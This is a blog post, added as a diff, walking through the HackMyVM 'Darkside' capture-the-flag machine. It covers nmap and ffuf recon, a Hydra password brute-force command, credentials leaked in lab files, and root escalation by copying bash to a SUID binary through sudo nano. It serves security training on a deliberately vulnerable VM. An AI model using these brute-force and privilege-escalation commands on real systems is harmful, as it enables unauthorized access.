@@ -1,0 +1,238 @@
+---
+layout: post
+title: "HackMyVM: Darkside"
+---
+A bite-sized and quirky VM that's easy to pwn, but you have to poke your nose around to do so. Perfect for beginners.
+
+### Recon
+
+**nmap**
+
+```
+Nmap scan report for 192.168.56.107  
+Host is up (0.00032s latency).  
+Not shown: 998 closed ports  
+PORT   STATE SERVICE VERSION  
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)  
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))  
+| http-cookie-flags:    
+|   /:    
+|     PHPSESSID:    
+|_      httponly flag not set  
+|_http-server-header: Apache/2.4.56 (Debian)  
+|_http-title: The DarkSide  
+MAC Address: 08:00:27:29:44:83 (Oracle VirtualBox virtual NIC)  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+  
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
+```
+
+A standard 22-80 situation. We'll go for HTTP first, of course.
+
+**the website**
+
+![[Pasted image 20231120225907.png]]
+
+A plain login page. Standard credentials such as admin:admin don't work on it when we test. Since there isn't much else to go off of, we do some dirbusting.
+
+```
+thehated@TRYHARDER:~/ExploitScripts$ ffuf -u http://192.168.56.107/FUZZ -w ~/SecLists/Discovery/Web-Content/raft-small-words.txt    
+  
+       /'___\  /'___\           /'___\          
+      /\ \__/ /\ \__/  __  __  /\ \__/          
+      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
+       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
+        \ \_\   \ \_\  \ \____/  \ \_\          
+         \/_/    \/_/   \/___/    \/_/          
+  
+      v1.1.0  
+________________________________________________  
+  
+:: Method           : GET  
+:: URL              : http://192.168.56.107/FUZZ  
+:: Wordlist         : FUZZ: /home/thedoug/SecLists/Discovery/Web-Content/raft-small-words.txt  
+:: Follow redirects : false  
+:: Calibration      : false  
+:: Timeout          : 10  
+:: Threads          : 40  
+:: Matcher          : Response status: 200,204,301,302,307,401,403  
+________________________________________________  
+  
+.html                   [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htm                    [Status: 403, Size: 279, Words: 20, Lines: 10]  
+backup                  [Status: 301, Size: 317, Words: 20, Lines: 10]  
+.                       [Status: 200, Size: 683, Words: 162, Lines: 30]  
+.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.php                    [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.phtml                  [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htc                    [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html_var_DE            [Status: 403, Size: 279, Words: 20, Lines: 10]  
+server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.                  [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.html              [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htpasswds              [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htm.                   [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htmll                  [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.phps                   [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.old               [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.bak               [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.ht                     [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htm.htm                [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htgroup                [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html1                  [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.printable         [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.LCK               [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htm.LCK                [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htmls                  [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htx                    [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html.php               [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htaccess.bak           [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htlm                   [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htm2                   [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.htuser                 [Status: 403, Size: 279, Words: 20, Lines: 10]  
+.html-                  [Status: 403, Size: 279, Words: 20, Lines: 10]  
+:: Progress: [43003/43003] :: Job [1/1] :: 7167 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+```
+
+`/backup` o.o; that's always interesting. Piques our curiosity. What data could be in there?
+
+![[Pasted image 20231121172915.png]]
+
+vote.txt... wonder what that could be.
+
+```
+rijaba: Yes
+xerosec: Yes
+sml: No
+cromiphi: No
+gatogamer: No
+chema: Yes
+talleyrand: No
+d3b0o: Yes
+
+Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
+```
+
+There's our username! Since we don't have any sort of password leads, we may as well try to brute force it.
+
+### User
+
+To brute force passwords, we'll use our long-time friend Hydra! Employing this command (mind my IP and wordlist, replace those with yours), we'll surely find a user:pass combination that logs us in:
+```
+hydra -l kevin -P ~/SecLists/Passwords/Leaked-Databases/rockyou.txt 192.168.56.107 http-post-form "/:user=kevin&pass=^PASS^:invalid"
+```
+
+After a grand total of two seconds, we find the million-dollar prize:
+```
+kevin:iloveyou
+```
+
+When we log in with our prize, we see a string of encoded text. At least, that's what it appears like:
+
+![[Pasted image 20231121182242.png]]
+
+```
+kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC
+```
+
+Plugging this into CyberChef (because it simply doesn't resemble Base64 at all) and employing the magic module, we see our decoded text:
+![[Pasted image 20231121182545.png]]
+
+It wasn't Base64, that's for sure! Regardless, we now have a new potential path to visit on the site: `/sfqekmgncutjhbypvxda.onion`
+
+![[Pasted image 20231121182742.png]]
+
+Obviously, we have our answer: the dark side. But where do we answer this? Let's peer inside the source:
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Which Side Are You On?</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-size: 24px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <p>Which Side Are You On?</p>
+    </div>
+
+    <script>
+        var sideCookie = document.cookie.match(/(^| )side=([^;]+)/);
+        if (sideCookie && sideCookie[2] === 'darkside') {
+            window.location.href = 'hwvhysntovtanj.password';
+        }
+    </script>
+
+    
+</body>
+</html>
+```
+
+If the `side` cookie in our browser is `darkside`, it directs us to the sub-path `hwvhysntovtanj.password`. We don't have to change the cookie; we can simply go to the path `/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password`. This is a text file that reads: `kevin:ILoveCalisthenics`. This must be our ticket to SSH town! Attempts to log in with these credentials are affirmative, to say the least.
+```
+kevin@darkside:~$
+```
+
+### Root
+
+Inside kevin's home directory, there's a non-standard file:
+```
+kevin@darkside:~$ ls -la      
+total 796  
+drwxr-xr-x 4 kevin kevin   4096 Nov 22 01:05 .  
+drwxr-xr-x 4 root  root    4096 Oct 15 13:19 ..  
+lrwxrwxrwx 1 kevin kevin      9 Oct 30 08:41 .bash_history -> /dev/null  
+-rw-r--r-- 1 kevin kevin    220 Oct 15 12:54 .bash_logout  
+-rw-r--r-- 1 kevin kevin   3526 Oct 15 12:54 .bashrc  
+drwx------ 3 kevin kevin   4096 Nov 22 01:02 .gnupg  
+-rw-r--r-- 1 kevin kevin    113 Oct 15 13:37 .history  
+-rw-r--r-- 1 kevin kevin 776746 May 12  2022 linpeas.sh  
+drwxr-xr-x 3 kevin kevin   4096 Oct 15 13:37 .local  
+-rw-r--r-- 1 kevin kevin    807 Oct 15 12:54 .profile  
+-rw-r--r-- 1 kevin kevin     19 Oct 15 13:38 user.txt
+```
+
+`.history` isn't a file you see by default. Let's get our hands on dem contents:
+```
+ls -al  
+hostname -I  
+echo "Congratulations on the OSCP Xerosec"  
+top  
+ps -faux  
+su rijaba  
+ILoveJabita  
+ls /home/rijaba
+```
+
+From this file, we can infer that `ILoveJabita` is rijaba's password. A little pivoting on the way to root never hurt anyone.
+
+**From the Rijaba user**
+
+One of the first checks I always run is `sudo -l` to sniff any potential programs we could use. There is one!
+```
+rijaba@darkside:~$ sudo -l  
+Matching Defaults entries for rijaba on darkside:  
+   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
+  
+User rijaba may run the following commands on darkside:  
+   (root) NOPASSWD: /usr/bin/nano
+```
+
+`nano` allows you to execute commands directly from the editor itself through the CTRL+T command. I personally used this line to copy the bash shell and make it SUID:
+```
+cp /bin/bash /tmp/thehated; chmod u+s /tmp/thehated
+```
+
+Once you run the SUID shell with the -p flag, the root shell is achieved; truly on the dark side now, huh? Or maybe not.
+```
+thehated-5.1#
+```
